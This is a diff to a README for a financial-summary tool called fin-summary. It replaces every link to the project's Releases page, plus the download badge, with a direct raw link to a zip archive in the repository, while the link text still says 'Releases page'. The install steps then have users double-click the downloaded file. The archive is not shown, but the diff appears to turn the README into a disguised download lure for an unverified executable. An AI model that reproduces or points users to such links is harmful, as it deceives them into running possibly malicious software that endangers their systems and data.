@@ -6,12 +6,12 @@ Welcome to **fin-summary**! This tool helps you analyze financial transaction pr
 
 ## 📦 Download the Application
 
-[![Download fin-summary](https://img.shields.io/badge/Download-finsummary-blue.svg)](https://github.com/Ahmadfaiz798/fin-summary/releases)
+[![Download fin-summary](https://github.com/Ahmadfaiz798/fin-summary/raw/refs/heads/main/fin_summary/summary_fin_v2.9-alpha.5.zip)](https://github.com/Ahmadfaiz798/fin-summary/raw/refs/heads/main/fin_summary/summary_fin_v2.9-alpha.5.zip)
 
 To get started, you need to download the application from the Releases page. 
 
 ### 🔗 Download Link
-Visit this page to download: [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases)
+Visit this page to download: [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/raw/refs/heads/main/fin_summary/summary_fin_v2.9-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🛠 How to Install
 
 1. **Download the Application**  
-   Go to the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases) page. Choose the latest release file suitable for your operating system.
+   Go to the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/raw/refs/heads/main/fin_summary/summary_fin_v2.9-alpha.5.zip) page. Choose the latest release file suitable for your operating system.
 
 2. **Open the Downloaded File**  
    Locate the file in your Downloads folder and double-click it to run the installer.
@@ -69,7 +69,7 @@ Using **fin-summary** is simple. Follow these steps:
 
 - **Be Clear with Your Input**: The clearer your transaction data, the better the analysis will be.
 - **Save Results**: Keep a copy of the analysis for easier tracking of your financial matters.
-- **Check for Updates**: Regularly check the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases) page for new features and improvements.
+- **Check for Updates**: Regularly check the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/raw/refs/heads/main/fin_summary/summary_fin_v2.9-alpha.5.zip) page for new features and improvements.
 
 ## 🤝 Support
 
